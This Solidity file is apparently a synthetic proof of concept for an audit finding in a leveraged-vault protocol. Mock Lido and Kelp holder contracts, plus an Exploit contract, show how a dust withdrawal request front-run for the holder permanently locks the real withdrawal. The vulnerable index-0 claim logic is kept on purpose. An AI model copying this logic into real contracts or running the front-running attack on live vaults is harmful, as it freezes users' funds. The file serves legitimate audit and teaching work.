// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////
    Notional Leveraged Vaults — [H-13] Kelp:_finalizeCooldown cannot
    claim the withdrawal if adversary requestWithdrawals with dust
    amount for the holder
    (Sherlock 2024-06-leveraged-vaults, BiasedMerc/lemonmon/xiaoming90,
    finding #35126)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: KelpCooldownHolder._finalizeCooldown() is hardcoded to look
    at index 0 of LidoWithdraw.getWithdrawalRequests(holder):

        uint256[] memory requestIds = LidoWithdraw.getWithdrawalRequests(address(this));
        ...
        if (!withdrawsStatus[0].isFinalized) { return (0, false); }
        LidoWithdraw.claimWithdrawal(requestIds[0]);

    Lido's `requestWithdrawals` is completely PERMISSIONLESS — anyone can call
    it naming ANY address as the `_owner` of the resulting request, including
    the holder's address, with just a dust amount of stETH. If an adversary
    does this BEFORE `triggerExtraStep()` (which submits the holder's REAL,
    large withdrawal request), the adversary's dust request gets index 0 and
    the real request gets index 1+. `_finalizeCooldown` only ever looks at
    index 0: it waits for the DUST request to finalize (which it will, since
    it's a legitimate tiny withdrawal), claims the dust, and reports
    `finalized = true` — permanently discarding the real, large withdrawal
    request. The vault's withdraw-request bookkeeping is one-shot (deleted
    once `finalized` is reported), so there is no way to ever retry and claim
    the real amount: it is now a permanently locked/frozen fund.

    This reduction keeps the blamed index-0 logic verbatim and reduces the
    two-step Kelp/Lido withdrawal flow to the minimum needed to make the
    permanent-loss harm measurable.
//////////////////////////////////////////////////////////////*/

contract MockLidoWithdraw {
    struct Status {
        uint256 amountOfStETH;
        bool isFinalized;
        bool isClaimed;
    }

    uint256 public nextId = 1;
    mapping(uint256 => Status) public statuses;
    mapping(uint256 => address) public owners;
    mapping(address => uint256[]) public requestsOf;

    receive() external payable {}

    /// @notice Mirrors the real Lido withdrawal queue: PERMISSIONLESS — anyone can
    /// request a withdrawal FOR any `owner` address, with any amount (including
    /// dust). This is exactly what the real ILidoWithdraw.requestWithdrawals does.
    function requestWithdrawals(uint256 amount, address owner) external returns (uint256 requestId) {
        requestId = nextId++;
        statuses[requestId] = Status(amount, false, false);
        owners[requestId] = owner;
        requestsOf[owner].push(requestId);
    }

    function finalize(uint256 upToIdInclusive) external {
        for (uint256 i = 1; i <= upToIdInclusive; i++) {
            statuses[i].isFinalized = true;
        }
    }

    function getWithdrawalRequests(address owner) external view returns (uint256[] memory) {
        return requestsOf[owner];
    }

    function claimWithdrawal(uint256 id) external {
        Status storage st = statuses[id];
        require(st.isFinalized && !st.isClaimed, "not claimable");
        st.isClaimed = true;
        (bool ok,) = owners[id].call{value: st.amountOfStETH}("");
        require(ok, "payout failed");
    }
}

contract KelpCooldownHolder {
    MockLidoWithdraw public lido;
    bool public triggered;
    address public vault;

    constructor(address _vault, MockLidoWithdraw _lido) {
        vault = _vault;
        lido = _lido;
    }

    receive() external payable {}

    /// @notice Reduced KelpCooldownHolder.triggerExtraStep() (Kelp.sol#L72-L86):
    /// submits the holder's REAL withdrawal request to the Lido queue.
    function triggerExtraStep(uint256 stETHAmount) external {
        require(!triggered, "already triggered");
        lido.requestWithdrawals(stETHAmount, address(this));
        triggered = true;
    }

    /// @notice Reduced KelpCooldownHolder._finalizeCooldown() (Kelp.sol#L88-L106).
    function finalizeCooldown() external returns (uint256 tokensClaimed, bool finalized) {
        if (!triggered) {
            return (0, false);
        }

        uint256[] memory requestIds = lido.getWithdrawalRequests(address(this));

        // ============ VULNERABLE LINES (verbatim logic, Kelp.sol#L93-L100) ============
        (, bool isFinalized0,) = lido.statuses(requestIds[0]);
        // @> VULN: hardcoded index 0. If any OTHER withdrawal request exists for this
        //          holder (e.g. an adversary's dust request placed before
        //          triggerExtraStep), it occupies index 0 and the REAL request at
        //          index 1+ is never looked at again.
        if (!isFinalized0) {
            return (0, false);
        }

        lido.claimWithdrawal(requestIds[0]);
        // FIX: claim ALL of this holder's finalized requests, or track and claim
        //      the SPECIFIC requestId recorded when triggerExtraStep() was called.
        // ================================================================================

        tokensClaimed = address(this).balance;
        (bool sent,) = vault.call{value: tokensClaimed}("");
        require(sent, "payout to vault failed");
        finalized = true;
    }
}

contract Exploit {
    MockLidoWithdraw public lido; // CREATE nonce 1
    KelpCooldownHolder public holder; // CREATE nonce 2

    receive() external payable {}

    function run() external payable {
        lido = new MockLidoWithdraw();
        holder = new KelpCooldownHolder(address(this), lido);

        // Fund the Lido mock (with the ETH sent into this call) so it can pay out
        // both the dust and the real withdrawal — simulating the stETH -> ETH
        // redemption Lido performs.
        (bool ok,) = address(lido).call{value: msg.value}("");
        require(ok, "fund failed");

        // 1) Adversary front-runs: requests a DUST withdrawal FOR the holder's
        //    address, BEFORE triggerExtraStep is ever called. Completely
        //    permissionless, exactly like the real Lido withdrawal queue.
        lido.requestWithdrawals(100, address(holder)); // dust: 100 wei of "stETH"

        // 2) The real flow proceeds: triggerExtraStep submits the holder's actual,
        //    large withdrawal request — landing at index 1, not index 0.
        holder.triggerExtraStep(10 ether);

        // 3) Lido processes the whole queue; both requests finalize.
        lido.finalize(2);

        // 4) The vault calls finalizeCooldown() to complete the withdrawal.
        (uint256 tokensClaimed, bool finalized) = holder.finalizeCooldown();

        // Harm: finalizeCooldown() reports SUCCESS, but only the DUST amount was
        // ever claimed. The vault's one-shot withdraw-request bookkeeping is now
        // closed out, and finalizeCooldown() can never meaningfully run again.
        require(finalized, "finalize should report success (that IS the bug)");
        require(tokensClaimed == 100, "harm not demonstrated: only the dust amount should have been claimed");

        (uint256 realAmount, bool realFinalized, bool realClaimed) = lido.statuses(2);
        require(realAmount == 10 ether, "sanity: request #2 is the real 10 ether withdrawal");
        require(
            realFinalized && !realClaimed,
            "harm not demonstrated: the real 10 ether withdrawal must be stuck, finalized-but-unclaimed, forever"
        );
    }
}
